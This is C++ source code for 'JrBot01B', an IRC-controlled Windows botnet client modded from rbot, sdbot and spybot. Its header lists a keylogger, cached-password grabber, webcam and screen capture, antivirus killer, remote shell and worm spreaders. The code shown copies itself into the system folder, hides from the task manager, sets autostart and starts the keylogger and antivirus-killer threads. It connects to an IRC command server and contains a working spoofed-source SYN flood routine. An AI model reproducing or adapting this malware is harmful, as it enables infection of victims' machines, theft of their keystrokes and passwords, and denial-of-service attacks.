/*
  +-------------------------------------+
  | Modded rbot032 (JrBot01B) by JynX   |
  | spybot+sdbot+rbot+wisdom=Jrbot :P   |
  |                                     |
  |           Version 01b               |
  +-------------------------------------+

//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!!
//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!//READ THIS!!!

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!                     Change all bot.exe to ur bot.exe								!!!!
!!!!  TO KILL A SPYBOT THREAD type .sk <spybotthreadno.> -> .sk 1                       !!!!
!!!! TEST 10 - 30 BOTS FIRST BEFORE USING.. I NOT RESPONSIBLE FOR BOT LOST COZ OF BUGS. !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Worklog: 
(01Beta) JrBot01B : //call me lamer, ripper .. 
    i dont care... all i say is gago ka!:P haha.
	|shouts to rbotdevteam , mich, wisdom writer. |
 - Added ntscan port
 - Added config.h more eassy to config and the main.cpp puted the exe name a some place where it need so it infect better
 - Added config.cpp for noobs. :) .. hey I am a noob also. :p but.. i dont care. bleh.
 - Added screen capture, webcam capture (avi or bmp) -from wisdombot
 - Added active window -- usefull for screen capture..
 - Added Gethost -jnx e.g. <@me>.gethost .gov or .edu or .mil
 - Added Hostjoin -jnx e.g. <@me>.hostjoin .gov *** <bot>has joined #.gov
 - Added generate nick -- .gn
 - Added uptime nick "command" - jnx -- .upnick --has some little bugs.. but it works.
 - Added Keylogger & keylogafterstartup // .keylog #urchan or pm the bot and type .keylog
 - Added more options @ options.cpp .. nopm.. etc
 - Added Httpd
 - Added onjoin user/chan modes -jnx :) 
 - Added AV/exe Killer
 - Added Sdbot's scanner logging - jnx
 - Added cached password grabber
 - Added remotecmd
 - Added SPYBOT's Spreaders
 - Added Optix spreader
 - Fixed the ntstop command, which only kills thread 1. It now kills NTScan named threads.. 
 - Fixed startup bug :p
 - modified ntpass function
 - Changed milliseconds on sd's port scan to seconds..
 - Changed all spy thread to sd thread except for httpd... cant figure it out..:[
	
[soon]
 - other rat spreaders..
 - err dcom.. 

 Contact me email or messenger : gcd135@hotmail.com  || Dalnet #bot-making, #rbot 
*/

#include <winsock2.h>
#include <winsock.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <vfw.h>
#include <Winnetwk.h>
#include <lm.h>
#include <lmat.h>
//#include <ras.h>

#include "config.h"
#include "options.h"
#include "arrays.h"


#define addpredefinedaliases() \

#define WIN32_LEAN_AND_MEAN
#define MAX_LINES 20

//handles
HANDLE Threat_Handle;
HANDLE hFileMap;
#ifndef NO_REMOTECMD
HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
#endif
HANDLE threads[256];     // thread handles



 // Scan structure
 typedef struct scans {
	SOCKET sock;
	IN_ADDR addy;
	DWORD host;
	char file[MAX_PATH];
	char chan[128];
	char id[128];
	int port;
	int delay;
	int state; //0 = empty, 1 = active thread
	int extra;

	int threadnum;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL cgotinfo;
 } scans;

 
  // NTPass msg structure
 struct NT_msg {
 	 SOCKET sock;
	 BOOL notice;
	 char chan[128];
 };
 NT_msg *nt_msg= new NT_msg;

  
 // Keylogger's structure 
 struct Keylogger { 
    SOCKET sock; 
	BOOL notice; 
    char chan[128]; 
    char logfile[MAX_PATH];
	int threadnum;
 }; 
 Keylogger *keylogs= new Keylogger; 

 

 // SpyBot's thread's structure
 typedef struct threds_struct {
	char name [250];
	int id;
	int num;
	int port;
	SOCKET sock;
	HANDLE Threat_Handle;
	char dir[MAX_PATH];
	char file[MAX_PATH];
 } thred;
 thred threds[40];

 // Cached passwords structure.
 struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
 };

 typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );
 DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);
 typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);
 ENUMPASSWORD pWNetEnumCachedPasswords;
 
 typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
 } PASSCACHECALLBACK_DATA;
 
   
 // ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL encrypted;
	unsigned long expectedcrc;
	unsigned long filelen;
 } ds;
 #endif

 #ifndef NO_REDIRECT
// redirect structure.
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } rs;
  #endif


 #ifndef NO_SOCK4SERV
 // socks4 daemon structure.
 typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
 }SOCKS4HEADER;
 #endif
 


 // alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 #ifndef NO_PING
// icmp.dll typedefs/structs
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

 struct NTSCAN {
	DWORD threads;
	DWORD minutes;
	DWORD threadid;
	char ipmask[20];
};

// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;
 #endif

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

 // For dynamically loaded... (won't give error on win9x).
typedef NET_API_STATUS (__stdcall *NSJA)(LPWSTR,LPBYTE,LPDWORD);
NSJA fNetScheduleJobAdd;

typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
NABF fNetApiBufferFree;

typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
NRTOD fNetRemoteTOD;

typedef NET_API_STATUS (__stdcall *NUE)(LPWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
NUE fNetUserEnum;

// kernel32.dll function variables
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD); 
 CT32S fCreateToolhelp32Snapshot; 
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32); 
 P32F fProcess32First; 
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32); 
 P32N fProcess32Next; 

 BOOL ntscan=FALSE;
 BOOL scanning=FALSE; 
 char scanip[20];
 SOCKET sock2;

// Function prototypes
 unsigned long crc32(char *buf, size_t size);
 long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
 long SYNFlood(char *target, char *port, char *len);

 int set (char **wildcard, char **test);
 int asterisk (char **wildcard, char **test);
 int wildcardfit (char *wildcard, char *test);
 int HostMaskMatch(char *h);
 
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 LPSTR mData;
 void mirccmd(char *cmd);


 BOOL privmsg(SOCKET sock,char *msg,char *chan);

 int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir);
 int cashedpasswords(SOCKET sock,char *sendto);
 char * generatenick(char * strbuf);
 SOCKET Listen(int port); 
 SOCKET create_sock(char *host, int port);

 int RAT_Receive(SOCKET sock);
 #ifndef NO_SUB7
 int SUB7(SOCKET sock);
 #endif
 #ifndef NO_KUANG
 int KUANG(SOCKET sock);
 #endif
 #ifndef NO_DEVIL
 int DEVIL(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan);
 #endif
 #ifndef NO_OPTIX
 int tixRoot(char *szIP, int Port, char *szPass, char *szFile);
 bool tixUpload(char *szIP, char *szFile);
 #endif

 #ifndef NO_HTTPD
 int HTTP_server(char *dir,int port);
 DWORD WINAPI HTTP_server_thread(LPVOID Param);
 int Check_Requestedfile(SOCKET sock,char * dir,char * rFile);
 int getfiles(char *current,SOCKET dccsock,char *chan,char *URL);
 DWORD WINAPI  http_header(LPVOID param);
 void http_send_file(SOCKET sock,char *file);
 char * file_to_html(char *file);
 #endif

 #ifndef NO_REMOTECMD
 void Close_Handles(void);
 DWORD WINAPI PipeReadThread(LPVOID param);
 int pipe_send(SOCKET sock,char *chan,char *buf);
 int open_cmd(SOCKET sock,char * chan);
 DWORD WINAPI PipeReadThread(LPVOID param);
 #endif

 #ifndef NO_KEYLOGGER
 void Keyevent (BYTE key,BOOL caps); 
 int sendkeys(SOCKET sock,char *buf,char *window, char *logfile); 
 DWORD WINAPI keylogger(LPVOID param); 
 #endif

 #ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param);
 DWORD WINAPI ip_scan(LPVOID param);
 #endif


 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 
 void writekeys();
 
 DWORD WINAPI irc_connect(LPVOID param);
 DWORD WINAPI kill_av(LPVOID param);

 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);


 char * replacestr(char *str, char *oldstr, char *newstr);
 char pm[64];


 BOOL Capture(char *file);
 int CaptureFrame(char *file, int index, int x, int y);
 int CaptureVideo(char *file, int index, int time, int x, int y);
 
 

 int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread);

 
 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif
 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 unsigned __int64 cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_SOCK4SERV
 DWORD WINAPI SocksDaemon(LPVOID param);
 DWORD WINAPI Socks4ClientThread(LPVOID pParam);
 void transfer_loop(SOCKET target, SOCKET client);
 #endif
 void uninstall(void);
 

// global variables
 HANDLE ih;              // internet handle
 char threadd[256][128];  // thread descriptions
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable

 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 DWORD started;          // time bot was started
 int ntstats = 0;    // Number of NTPass 'sploits
 int current_version=0;

 BOOL cam = FALSE;
 BOOL scanlogging = FALSE;
 BOOL notice;
 char This_File[MAX_PATH];
 char SystemDir[MAX_PATH];
 int sendkeysto = 0;

 //void irc_send(SOCKET sock, char *msg);
 int NetConnect(char *szUserName, char *szPassWord, char *szIP);
 DWORD WINAPI PortScanner(LPVOID param);
 //int RootBox(char *szIP);
 void enumusers(char *szServer);
 DWORD WINAPI ntpass_main(void *pnts);
 


 int Split(char *inStr, void *saveArray);
 unsigned long ResolveAddress(char *Host);
 char *Xorbuff(char *buff,int buffLen);
 //#include "ntpass.cpp"

 
 #ifndef NO_SYN 
 #define IP_HDRINCL  2 
 
 typedef struct ip_hdr 
 {  unsigned char h_verlen; 
    unsigned char tos; 
    unsigned short total_len; 
    unsigned short ident; 
    unsigned short frag_and_flags; 
    unsigned char ttl; 
    unsigned char proto; 
    unsigned short checksum; 
    unsigned int sourceIP; 
    unsigned int destIP; 
 } IPHEADER; 
 
 typedef struct tsd_hdr 
 {  unsigned long saddr; 
    unsigned long daddr; 
    char mbz; 
    char ptcl; 
    unsigned short tcpl; 
 } PSDHEADER; 
 
 typedef struct tcp_hdr 
 {  USHORT th_sport; 
    USHORT th_dport; 
    unsigned int th_seq; 
    unsigned int th_ack; 
    unsigned char th_lenres; 
    unsigned char th_flag; 
    USHORT th_win; 
    USHORT th_sum; 
    USHORT th_urp; 
 } TCPHEADER;

typedef struct synt 
{
char ip[128];
char port[128];
char length[128];
char chan[128];
BOOL notice;
int threadnumber;
SOCKET socket;
} synt;

 DWORD WINAPI synthread(LPVOID param);
 #endif

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 { 
	WSADATA wsadata;
	int i = 0, err = 0;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
	DWORD id;
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;

    #ifndef NO_PING
	// load icmp.dll functions
 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	#endif

	srand(GetTickCount());
    // append this:
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");

		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot"); 
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First"); 
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next"); 

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	CreateMutex(NULL, FALSE, botid);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(5000);		//for updates... cheap bugfix.
	}

	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}

	srand(GetTickCount());
	
	if (rndfilename) rndnick((char *)&filename); 
	else strncpy(filename1, filename, sizeof(filename1)-1);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	strcat(SystemDir,"\\");
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE)
			Sleep(5000);


		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_SHOW;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}

	if (AutoStart) { 
	writekeys();
	}

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("Main thread");

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("Bot started");

	#ifdef Use_Firewall_killer
	int avsthreadnum;
	avsthreadnum = addthread("F/AV Killer");
	threads[avsthreadnum] = CreateThread(NULL, 0, &kill_av, NULL, 0, &id);
	//HANDLE AvsKill;
	//AvsKill = CreateThread(NULL, 0, &kill_av, NULL, 0, 0);
	#endif
	
	
	#ifdef start_keylogger_afterstartup
	memset(keylogs->chan,0,sizeof(keylogs->chan));
	char sendbuf[512];
	//Threat_Handle = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
	sprintf(sendbuf,"Keys logging to %s\\%s",sysdir,keylogfilename);
	int keylogthreadnum = addthread(sendbuf);
	threads[keylogthreadnum] = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
	//spyaddthread(sendbuf,0,Threat_Handle,2,"\0");
	#endif


	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();
	
	#ifndef NO_REMOTECMD
	Close_Handles();
	#endif

	return 0;
 }

#ifndef NO_SYN
  USHORT checksum(USHORT *buffer, int size) 
{ 
   unsigned long cksum=0; 

   while(size > 1) { cksum+=*buffer++; size -= 2; }
   if(size) cksum += *(UCHAR*)buffer; 
 
   cksum = (cksum >> 16) + (cksum & 0xffff); 
   cksum += (cksum >>16); 
   return (USHORT)(~cksum); 
}
 
u_long LookupAddress(const char* szHost)
{
   u_long nRemoteAddr = inet_addr(szHost);
   struct hostent *pHE;

   if (nRemoteAddr == INADDR_NONE)
       {
       pHE = gethostbyname(szHost);
       if (pHE == 0) return INADDR_NONE;
       nRemoteAddr = *((u_long*)pHE->h_addr_list[0]);
       }

   return nRemoteAddr;
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{ 
   WSADATA WSAData; 
   SOCKET sock; 
   SOCKADDR_IN addr_in; 
   IPHEADER ipHeader; 
   TCPHEADER tcpHeader; 
   PSDHEADER psdHeader; 
 
   LARGE_INTEGER freq, halt_time, cur;
   char szSendBuf[60]={0}; 
   BOOL flag; 
   int rect;
   long total;
   char buf[64];

   if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
       return FALSE; 
 
   if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED ))==INVALID_SOCKET)
       return FALSE; 

   flag=TRUE;
   if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
       return FALSE; 

   addr_in.sin_family=AF_INET;
   addr_in.sin_port=htons(TargetPort);
   addr_in.sin_addr.s_addr=TargetIP;

   ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
   ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
   ipHeader.ident=1;
   ipHeader.frag_and_flags=0;
   ipHeader.ttl=128;
   ipHeader.proto=IPPROTO_TCP;
   ipHeader.checksum=0;
   ipHeader.destIP=TargetIP;
   tcpHeader.th_dport=htons(TargetPort);
   tcpHeader.th_ack=0;
   tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
   tcpHeader.th_flag=2; 
   tcpHeader.th_win=htons(16384); 
   tcpHeader.th_urp=0; 
 
   total = 0;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&cur);
   halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
   while(TRUE) 
      {
      tcpHeader.th_sum=0; 
 
      psdHeader.daddr=ipHeader.destIP; 
      psdHeader.mbz=0; 
      psdHeader.ptcl=IPPROTO_TCP; 
      psdHeader.tcpl=htons(sizeof(tcpHeader)); 
      ipHeader.sourceIP=htonl(SpoofingIP++); 

      tcpHeader.th_sport=htons((rand() % 1001) + 1000 ); // source port 
      tcpHeader.th_seq=htons((rand() << 16) | rand());
 
      psdHeader.saddr=ipHeader.sourceIP; 
 
      memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
      memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
      tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
      memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
      memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
      ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
 
      rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
      if (rect==SOCKET_ERROR)
         {
          sprintf(buf, "SYN flood error: %d\n",WSAGetLastError());
          addlog(buf);
          return 0;
         }
     
      total += rect;
      QueryPerformanceCounter(&cur);
      if (cur.QuadPart >= halt_time.QuadPart)
         break;
     }

   closesocket(sock); 
   WSACleanup(); 
 
   return (total);
}

long SYNFlood(char *target, char *port, char *len)
{
   unsigned long TargetIP;
   unsigned short p;
   unsigned int SpoofIP;
   long num;
   int t;
   char buf[80];

   TargetIP = LookupAddress((const char *)target);
   p = atoi(port);
   t = atoi(len);
   SpoofIP = TargetIP + ((rand()%512)+256);

   num = SendSyn(TargetIP, SpoofIP, p, t);

   #ifdef REMOVE_NONSYNNERS
   if (!num)
       {
       uninstall();
       WSACleanup();
       ExitProcess(0);
       }
   #endif

   if (!num) num = 1;  // 'Div by zero' kludge
   num = num / 1000 / t;

   sprintf(buf, "SYN flood: %s:%s [%iKB/s]", target, port, num);
   addlog(buf);
   return num;
}
#endif

// function to add a log item
 void addlog(char *desc)
 {
	char szTime[64];
	SYSTEMTIME st;

	GetLocalTime(&st);

	GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, "hh:mm:sstt", szTime, sizeof(szTime));

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %s] %s", st.wMonth, st.wDay, st.wYear, szTime, desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;


	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);

		ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		if (ssin.sin_addr.s_addr==0) return 0;

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) {
			nick1 = irc.nick; 
		} else {
			nick1 = rndnick(nick);
			DWORD uptime;
			uptime=GetTickCount();
			if (uptime > 864000000) {	//If uptime is greater than 10 days, mark them out...
				nick1[0]='[';
				nick1[1]='1';
				nick1[2]='0';
				nick1[3]=']';
				if (uptime > 1296000000) {	//15 days
				    nick[0]='[';
				    nick[1]='1';
				    nick[2]='5';
			    	nick[3]=']';
					if (uptime > 1728000000) {
						nick[0]='[';
				        nick[1]='2';
			         	nick[2]='0';
			        	nick[3]=']';
						if (uptime > 2592000000) {
							nick1[0]='[';
							nick1[1]='3';
							nick1[2]='0';
							nick1[3]=']';
						}
					}
				}
			}
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "Connected to %s", irc.host);

		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
